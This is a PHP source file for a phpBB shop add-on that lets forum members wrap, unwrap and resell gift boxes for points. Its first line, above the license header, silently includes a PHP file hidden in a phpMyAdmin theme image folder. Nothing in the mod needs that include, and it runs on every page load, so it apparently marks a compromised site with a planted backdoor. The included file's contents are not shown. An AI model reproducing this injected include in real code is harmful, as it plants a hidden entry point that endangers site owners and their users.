<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                              shop_wrap.php
 *                            -------------------
 *   Version		: 1.0.1
 *   Website		: http://www.zarath.com
 *
 ***************************************************************************/
/***************************************************************************
 *
 *   copyright (C) 2006  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//
//
// Start page Variables
//
if (!(@include($phpbb_root_path . 'language/lang_' . $userdata['user_lang'] . '/lang_shop.' . $phpEx))) { include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_shop.' . $phpEx); }


if ( isset($HTTP_GET_VARS['action']) || isset($HTTP_POST_VARS['action']) ) { $action = ( isset($HTTP_POST_VARS['action']) ) ? $HTTP_POST_VARS['action'] : $HTTP_GET_VARS['action']; }
else { $action = ''; }


// This are the available box colours. Should be set up like $col_array = array('Blue', 'Green'); etc
$col_array = array('Aqua', 'Blue', 'Green', 'Pink', 'Rainbow', 'Yellow');

$normal_box_cost = '10'; // This is the cost of a box wrapped without a bow.
$bow_box_cost = '15'; // This is the cost of a box wrapped with a bow.
$max_bow_resell = '10'; // This is the max a bow will resell for, random of 1 to this number.

//
// End page variables
//


# Start of main shop
if ( empty($action) )
{
	$template->set_filenames(array(
		'body' => 'shop/shop_wrap_body.tpl')
	);

	#
	# Set User's items that can be wrapped into a variable!
	#
	$user_items = '';

	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'
			AND worn = 0
			AND item_name NOT LIKE '%wrapping bow%'
			AND wrapped = '0'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting unwrapped items!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);

	for ( $i = 0; $i < $sql_count; $i++ )
	{
		if (!( $row = $db->sql_fetchrow($result) ))
		{
			message_die(GENERAL_ERROR, "Error getting unwrapped items!", '', __LINE__, __FILE__, $sql);
		}

		$item_list .= '<option value="' . $row['id'] . '">' . $row['item_name'] . '</option>';
	}

	if ( !empty($item_list) )
	{
		$template->assign_block_vars('switch_can_wrap', array());
	}
	else
	{
		$template->assign_block_vars('switch_no_items', array(
			'L_UNABLE_WRAP' => $lang['wshop_nothing'],
		));
	}

	//
	// Wrapping Paper Colours
	//
	$col_count = count($col_array);
	for ( $i = 0; $i < $col_count; $i++ )
	{
		$col_list .= '<option value="' . $col_array[$i] . '">' . $col_array[$i] . '</option>';
	}

	#
	# End listing -- Check if they have any bows to resell.
	#
	$enchants = array();
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE user_id = '{$userdata['user_id']}'
			AND worn = 0
			AND item_name = 'Wrapping Bow'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting bow info!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);

	for ( $i = 0; $i < $sql_count; $i++ )
	{
		if (!( $row = $db->sql_fetchrow($result) ))
		{
			message_die(GENERAL_ERROR, "Error getting bow info!", '', __LINE__, __FILE__, $sql);
		}
		$sell_bows .= '<option value="' . $row['item_id'] . '">' . $row['item_name'] . '</option>';

	}

	if ( $i > 0 )
	{
		$template->assign_block_vars('switch_can_sell', array(
			'SELL_ITEMS' => $sell_bows));
	}

	$page_title = $lang['wshop_shop_name'];
	$title = $lang['wshop_table_title'];
	$shoplocation = ' -> <a href="'.append_sid('shop.'.$phpEx, true).'" class="nav">Shop List</a> ->  <a href="' . append_sid("shop_wrap.$phpEx") . '" class="nav">' . $page_title . '</a>';


	$template->assign_vars(array(
		'COLOR_LIST' => $col_list,
		'ITEM_LIST' => $item_list,

		'PAPER_COST' => $normal_box_cost,
		'BOW_COST' => $bow_box_cost,

		'USER_POINTS' => $userdata['user_points'],
		'SHOPLOCATION' => $shoplocation,

		'U_INVENTORY' => append_sid("shop.$phpEx?action=inventory&searchid=".$userdata['user_id']),
		'U_ACTION' => append_sid("shop_wrap.$phpEx"),

		'L_INVENTORY' => $lang['shop_your_inv'],
		'L_PERSONAL_INFO' => $lang['shop_personal_info'],
		'L_POINTS_NAME' => $board_config['points_name'],
		'L_SHOP_TITLE' => $title,
		'L_SELL_BOW' => $lang['wshop_sell_bow'],
		'L_WRAP_ITEM' => $lang['wshop_wrap_item'],
		'L_COLOR' => $lang['wshop_color'],
		'L_ITEM' => $lang['wshop_item'],
		'L_NONE' => $lang['wshop_none'],
		'L_COST' => $lang['wshop_cost'],
		'L_WRAP_PAPER' => $lang['wshop_wrap_paper'],
		'L_WRAP_BOW' => $lang['wshop_wrap_bow']
	));
	$template->assign_block_vars('', array());

}

# Wrap Action
elseif ( $action == 'wrap' )
{
	if ( isset($HTTP_GET_VARS['item_id']) || isset($HTTP_POST_VARS['item_id']) ) { $item_id = ( isset($HTTP_POST_VARS['item_id']) ) ? $HTTP_POST_VARS['item_id'] : $HTTP_GET_VARS['item_id']; }
	else { $item_id = ''; }
	if ( isset($HTTP_GET_VARS['color']) || isset($HTTP_POST_VARS['color']) ) { $color = ( isset($HTTP_POST_VARS['color']) ) ? $HTTP_POST_VARS['color'] : $HTTP_GET_VARS['color']; }
	else { $color = ''; }
	if ( isset($HTTP_GET_VARS['type']) || isset($HTTP_POST_VARS['type']) ) { $type = ( isset($HTTP_POST_VARS['type']) ) ? $HTTP_POST_VARS['type'] : $HTTP_GET_VARS['type']; }
	else { $type = ''; }

	if ( !$userdata['session_logged_in'] )
	{
		$redirect = 'shop_Wrap.'.$phpEx.'&action=wrap&item_id=' . $item_id . '&color=' . $color . '&type=' . $type;
		header('Location: ' . append_sid("login.$phpEx?redirect=$redirect", true));
	}

	if ( !is_numeric($item_id) || $item_id < 1 ) { message_die(GENERAL_MESSAGE, $lang['wshop_donotown']); }


	# Make sure user has item and enough gold and that colour is valid!
	$cost = ( $type == 'bow' ) ? $bow_box_cost : $normal_box_cost;

	if ( $userdata['user_points'] < $cost ) { message_die(GENERAL_MESSAGE, sprintf($lang['wshop_not_enough'], $board_config['points_name'])); }
	if ( !(in_array($color, $col_array)) ) { message_die(GENERAL_MESSAGE, $lang['wshop_invalid_paper']); }

	$type = ( $type == 'bow' ) ? 'bow' : 'normal';

	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE id = '$item_id'
			AND user_id = '{$userdata['user_id']}'
			AND worn = 0";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting synth items!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);

	if ( $sql_count )
	{
		if (!( $row = $db->sql_fetchrow($result) ))
		{
			message_die(GENERAL_ERROR, "Error getting user item information", '', __LINE__, __FILE__, $sql);
		}

		if ( $row['wrapped'] != '0' ) { message_die(GENERAL_MESSAGE, $lang['wshop_wrapped']); }

		#
		# Set up wrapping!
		#
		$wrap = ucfirst($color) . ' ' . $lang['wshop_box'] . ( ( $type == 'bow' ) ?  ' ' . $lang['wshop_with'] . ' ' . $lang['wshop_bow'] : '');

		$sql = "UPDATE " . USER_ITEMS_TABLE . "
			SET wrapped = '$wrap'
			WHERE user_id = '{$userdata['user_id']}'
				AND id = '$item_id'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error wrapping item!", '', __LINE__, __FILE__, $sql);
		}

		$sql = "UPDATE " . USERS_TABLE . "
			SET user_points = user_points - $cost
			WHERE user_id = '{$userdata['user_id']}'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error deleting item used to enchant!", '', __LINE__, __FILE__, $sql);
		}

               message_die(GENERAL_MESSAGE, sprintf($lang['wshop_wrap'], $row['item_name'], $cost, $board_config['points_name'], $wrap) . '<br /><br />' . sprintf($lang['wshop_link_back'], '<a href="' . append_sid('shop_wrap.php') . '" class="nav">', '</a>', $lang['wshop_shop_name']));
	}
	else
	{
		message_die(GENERAL_MESSAGE, $lang['wshop_donotown']);
	}
}

elseif ( $action == 'unwrap' )
{
	if ( isset($HTTP_GET_VARS['id']) || isset($HTTP_POST_VARS['id']) ) { $id = ( isset($HTTP_POST_VARS['id']) ) ? $HTTP_POST_VARS['id'] : $HTTP_GET_VARS['id']; }
	else { $id = ''; }
	$item_id = $id;

	if ( !$userdata['session_logged_in'] )
	{
		$redirect = 'shop_wrap.'.$phpEx.'&action=unwrap&item_id=' . $item_id;
		header('Location: ' . append_sid("login.$phpEx?redirect=$redirect", true));
	}

	if ( !is_numeric($item_id) || $item_id < 1 ) { message_die(GENERAL_MESSAGE, 'Sorry, that item is not valid and therefore cannot be wrapped!'); }


	# Make sure user has item!
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE id = '$item_id'
			AND user_id = '{$userdata['user_id']}'
			AND worn = 0
			AND wrapped != '0'";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting synth items!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);

	if ( $sql_count )
	{
		if (!( $row = $db->sql_fetchrow($result) ))
		{
			message_die(GENERAL_ERROR, "Error getting user item information", '', __LINE__, __FILE__, $sql);
		}

		#
		# Remove wrapping!
		#
		$sql = "UPDATE " . USER_ITEMS_TABLE . "
			SET wrapped = '0'
			WHERE user_id = '{$userdata['user_id']}'
				AND id = '$item_id'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error wrapping item!", '', __LINE__, __FILE__, $sql);
		}

		if ( substr_count($row['wrapped'], strtolower($lang['wshop_bow'])) || substr_count($row['wrapped'], $lang['wshop_bow']) )
		{
			$sql = "INSERT INTO " . USER_ITEMS_TABLE . "
				(user_id, item_id, item_name, item_s_desc, item_l_desc)
				VALUES('{$userdata['user_id']}', '-1', '{$lang['wshop_bow_name']}', '{$lang['wshop_bow_short']}', '{$lang['wshop_bow_long']}')";
			if ( !($db->sql_query($sql)) )
			{
				message_die(GENERAL_MESSAGE, 'Fatal Error: '.mysql_error());
			}
			$bow = $lang['wshop_remove_bow'] . '<br />';
		}

		message_die(GENERAL_MESSAGE, $bow . sprintf($lang['wshop_open_box'], $row['wrapped'], $row['item_name']) . '<br /><br />' . sprintf($lang['wshop_link_back'], '<a href="' . append_sid('index.php') . '" class="nav">', '</a>', $lang['wshop_forum_index']));
	}
	else
	{
		message_die(GENERAL_MESSAGE, $lang['wshop_no_item']);
	}
}


elseif ( $action == 'sell' )
{
	# Make sure user has item!
	$sql = "SELECT *
		FROM " . USER_ITEMS_TABLE . "
		WHERE item_name = '{$lang['wshop_bow_name']}'
			AND user_id = '{$userdata['user_id']}'
			AND worn = 0";
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, "Error getting synth items!", '', __LINE__, __FILE__, $sql);
	}
	$sql_count = $db->sql_numrows($result);

	if ( $sql_count )
	{

		#
		# Delete Bow
		#
		$sql = "DELETE FROM " . USER_ITEMS_TABLE . "
			WHERE user_id = '{$userdata['user_id']}'
				AND item_name = 'Wrapping Bow'
			LIMIT 1";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error removing bow!", '', __LINE__, __FILE__, $sql);
		}
		$rand = rand(1, $max_bow_resell);
		$sql = "UPDATE " . USERS_TABLE . "
			SET user_points = user_points + $rand
			WHERE user_id = '{$userdata['user_id']}'";
		if ( !($db->sql_query($sql)) )
		{
			message_die(GENERAL_ERROR, "Error adding points!", '', __LINE__, __FILE__, $sql);
		}


		message_die(GENERAL_MESSAGE, sprintf($lang['wshop_sell_bow'], $rand, $board_config['points_name'])  . '<br /><br />' . sprintf($lang['wshop_link_back'], '<a href="' . append_sid('shop_wrap.php') . '" class="nav">', '</a>', $lang['wshop_shop_name']));
	}
	else
	{
		message_die(GENERAL_MESSAGE, $lang['wshop_no_bow']);
	}
}

else 
{
	message_die(GENERAL_MESSAGE, 'This is not a valid command!');
}

//
// Start output of page
//
include($phpbb_root_path . 'includes/page_header.' . $phpEx);

//
// Generate the page
//
$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.' . $phpEx);

?>
